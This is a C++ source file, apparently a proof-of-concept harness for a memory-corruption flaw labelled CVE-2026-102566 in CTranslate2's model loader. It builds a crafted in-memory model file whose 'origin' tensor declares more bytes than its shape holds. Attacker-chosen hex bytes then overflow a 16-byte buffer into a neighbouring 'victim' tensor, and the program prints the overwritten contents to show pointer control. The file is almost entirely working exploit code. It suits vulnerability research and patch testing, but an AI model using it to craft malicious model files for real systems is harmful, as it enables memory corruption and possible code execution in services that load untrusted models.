// Pointer-control experiment for CVE-2026-102566. Same real Model::load path
// as driver.cpp, but the attacker payload is an explicit hex argument so the
// bytes written past the 16-byte StorageView can be chosen exactly.
#include <cstdint>
#include <cstdlib>
#include <iostream>
#include <memory>
#include <sstream>
#include <string>

#include <nlohmann/json.hpp>

#include "ctranslate2/devices.h"
#include "ctranslate2/models/model.h"
#include "ctranslate2/models/model_factory.h"
#include "ctranslate2/models/model_reader.h"
#include "ctranslate2/storage_view.h"
#include "ctranslate2/types.h"
#include "ctranslate2/utils.h"

using namespace ctranslate2;
using namespace ctranslate2::models;

namespace {
  class MiniModel : public Model {
  public:
    std::unique_ptr<Model> clone() const override { return std::make_unique<MiniModel>(); }
  };

  std::string crafted_model(const std::string& payload) {
    std::string b;
    auto u8 = [&](uint8_t v) { b.push_back(static_cast<char>(v)); };
    auto u16 = [&](uint16_t v) { u8(v & 0xff); u8(v >> 8); };
    auto u32 = [&](uint32_t v) { u8(v & 0xff); u8((v >> 8) & 0xff); u8((v >> 16) & 0xff); u8(v >> 24); };
    auto str = [&](const std::string& s) { u16(static_cast<uint16_t>(s.size() + 1)); b += s; u8(0); };

    u32(6);
    str("Transformer");
    u32(1);
    u32(2);

    str("origin");
    u8(2);
    u32(2); u32(2);
    u8(static_cast<uint8_t>(DataType::FLOAT32));
    u32(static_cast<uint32_t>(payload.size()));
    b += payload;

    str("victim");
    u8(2);
    u32(2); u32(2);
    u8(static_cast<uint8_t>(DataType::FLOAT32));
    u32(16);
    for (size_t i = 0; i < 16; ++i)
      u8(static_cast<uint8_t>('V'));

    u32(0);
    return b;
  }

  int hex_nibble(char c) {
    if (c >= '0' && c <= '9') return c - '0';
    if (c >= 'a' && c <= 'f') return c - 'a' + 10;
    if (c >= 'A' && c <= 'F') return c - 'A' + 10;
    return -1;
  }

  std::string decode_payload(const std::string& hex, size_t n) {
    std::string p;
    for (size_t i = 0; i < n; ++i) {
      int hi = i * 2 < hex.size() ? hex_nibble(hex[i * 2]) : -1;
      int lo = i * 2 + 1 < hex.size() ? hex_nibble(hex[i * 2 + 1]) : -1;
      if (hi < 0 || lo < 0) { p.push_back('A'); continue; }  // 'A' padding, as in the canonical driver
      p.push_back(static_cast<char>((hi << 4) | lo));
    }
    return p;
  }

  class MemReader : public ModelReader {
  public:
    explicit MemReader(std::string model) : _model(std::move(model)) {}
    std::string get_model_id() const override { return "mem://crafted"; }
    std::unique_ptr<std::istream> get_file(const std::string& filename,
                                           const bool) override {
      if (filename == "model.bin")
        return std::make_unique<std::istringstream>(_model);
      return nullptr;
    }
  private:
    std::string _model;
  };
}

namespace ctranslate2 {
  namespace models {
    std::shared_ptr<Model> create_model(const std::string&) {
      return std::make_shared<MiniModel>();
    }
  }
  void log_system_config() {}
}

int main(int argc, char** argv) {
  const size_t n = argc > 1 ? std::strtoul(argv[1], nullptr, 10) : 17;
  const std::string hex = argc > 2 ? argv[2] : "";
  auto payload = decode_payload(hex, n);
  MemReader reader(crafted_model(payload));
  std::cout << "CT2 payload consumer: num_bytes=" << n << std::endl;
  auto model = Model::load(reader, Device::CPU, 0);
  std::cout << "load returned; variables=" << model->get_variables().size() << std::endl;
  const auto& victim = model->get_variable("victim");
  const auto* p = static_cast<const char*>(victim.buffer());
  std::cout << "victim[0:16]=";
  for (size_t i = 0; i < 16; ++i)
    std::cout << (p[i] >= 32 && p[i] < 127 ? p[i] : '.');
  std::cout << std::endl;
  return 0;
}
